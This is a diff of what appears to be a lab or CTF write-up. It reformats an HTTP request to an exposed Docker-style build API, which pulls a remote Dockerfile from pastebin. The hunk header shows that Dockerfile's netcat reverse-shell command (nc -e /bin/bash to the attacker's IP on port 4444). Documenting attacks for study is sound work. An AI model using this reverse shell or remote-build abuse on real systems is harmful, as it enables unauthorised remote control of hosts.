@@ -69,19 +69,19 @@ CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]
 
 Afterwards, we start to craft the POST request and the JSON object needed in order to build our image.
 
-
-	POST /build?remote=https://pastebin.com/raw/twq0c1M4 HTTP/1.1
-	Host: 10.0.5.10:4000
-	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
-	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-	Accept-Language: en-US,en;q=0.5
-	Accept-Encoding: gzip, deflate
-	Connection: close
-	Upgrade-Insecure-Requests: 1
-	Content-Type: application/json
-	Content-Length: 2
-	{}
-
+```http
+POST /build?remote=https://pastebin.com/raw/twq0c1M4 HTTP/1.1
+Host: 10.0.5.10:4000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/json
+Content-Length: 2
+{}
+```
 
 The reponse came confirming the creation of the image successfully
 
